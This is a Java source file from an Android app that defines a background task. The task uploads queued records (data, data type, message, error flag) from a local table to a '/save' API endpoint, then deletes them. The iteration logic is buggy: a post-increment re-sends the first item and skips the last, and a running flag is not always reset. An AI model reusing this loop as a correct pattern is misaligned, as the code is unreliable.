package com.theah64.xrob.asynctasks;

import android.content.Context;
import android.util.Log;

import com.theah64.xrob.database.PendingDeliveries;
import com.theah64.xrob.database.PullQueue;
import com.theah64.xrob.models.PendingDelivery;
import com.theah64.xrob.models.PullQueueNode;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.json.JSONException;

import java.io.IOException;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 12/10/16.
 */

public class PullQueueSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {


    private static final String X = PullQueueSynchronizer.class.getSimpleName();
    private List<PullQueueNode> pqs;
    private int i = -1;
    private PullQueue pullQueueTable;
    private String apiKey;

    private static boolean isRunning = false;


    PullQueueSynchronizer(Context context, String apiKey) {
        super(context, apiKey);
    }


    @Override
    protected synchronized Void doInBackground(String... strings) {

        if (isRunning) {
            Log.e(X, "PullQueueSynchronizer running...");
            return null;
        }

        isRunning = true;

        pullQueueTable = PullQueue.getInstance(getContext());
        pqs = pullQueueTable.getAll();

        if (pqs != null) {
            //Opening api request gate
            new APIRequestGateway(getContext(), new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKeyLocal) {
                    apiKey = apiKeyLocal;
                    i = 0;
                    sync(pqs.get(i));
                }

                @Override
                public void onFailed(String reason) {
                    isRunning = false;
                }
            });
        } else {
            Log.d(X, "No pending deliveries found");
        }

        return null;
    }

    /**
     * Used to recursively save the data
     *
     * @param curQ
     */
    private void sync(final PullQueueNode curQ) {
        //TODO: need to upload each file here

        Log.d(X, "Syncing pending delivery : " + curQ);

        final Request pdReq = new APIRequestBuilder("/save", apiKey)
                .addParamIfNotNull(Xrob.KEY_DATA, curQ.getData())
                .addParamIfNotNull(Xrob.KEY_DATA_TYPE, curQ.getDataType())
                .addParamIfNotNull(Xrob.KEY_MESSAGE, curQ.getMessage())
                .addParamIfNotNull(Xrob.KEY_ERROR, String.valueOf(curQ.isError()))
                .build();

        //Setting delivery b-upload flag to true
        pullQueueTable.update(PullQueue.COLUMN_ID, curQ.getId(), PendingDeliveries.COLUMN_IS_BEING_UPLOADED, PendingDeliveries.TRUE);

        OkHttpUtils.getInstance().getClient().newCall(pdReq).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                pullQueueTable.update(PendingDeliveries.COLUMN_ID, curQ.getId(), PendingDeliveries.COLUMN_IS_BEING_UPLOADED, PendingDeliveries.FALSE);
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    pullQueueTable.update(PendingDeliveries.COLUMN_ID, curQ.getId(), PendingDeliveries.COLUMN_IS_BEING_UPLOADED, PendingDeliveries.FALSE);

                    new APIResponse(OkHttpUtils.logAndGetStringBody(response));

                    //That's done, now do next.
                    doNext(true);

                } catch (JSONException | APIResponse.APIException e) {
                    e.printStackTrace();

                    //If it's API error,delete it from db other wise move to next request.
                    doNext(e instanceof APIResponse.APIException);
                }
            }

            private void doNext(final boolean isDeleteFromDb) {

                //Delete previously posted request from db
                if (isDeleteFromDb) {

                    final boolean isDeleted = pullQueueTable.delete(PendingDeliveries.COLUMN_ID, curQ.getId());

                    if (!isDeleted) {
                        throw new IllegalArgumentException("Failed to delete pending delivery : " + curQ);
                    }
                }

                if (i < (pqs.size() - 1)) {
                    sync(pqs.get(i++));
                } else {
                    Log.e(X, "Pending delivery finished...");
                    isRunning = false;
                }
            }
        });

    }
}
